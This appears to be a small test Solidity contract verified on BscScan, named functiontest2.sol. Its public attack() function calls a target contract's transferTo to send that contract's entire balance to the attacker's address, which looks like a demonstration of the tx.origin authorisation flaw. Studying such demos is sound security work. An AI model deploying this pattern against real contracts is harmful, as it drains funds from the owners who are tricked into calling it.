/**
 *Submitted for verification at BscScan.com on 2022-01-02
*/

// File: contracts/functiontest2.sol

pragma solidity 0.8.8;
interface A {
    function transferTo(address payable account, uint amount) external;
}
contract B {
    address payable public owner;
    A a;

    constructor(A _a) {
        a = A(_a);
        owner = payable(msg.sender);
    }
    function attack() public {
        a.transferTo(owner, address(a).balance);
    }
    function balance() public view returns (uint) {
        return address(this).balance;
    }
}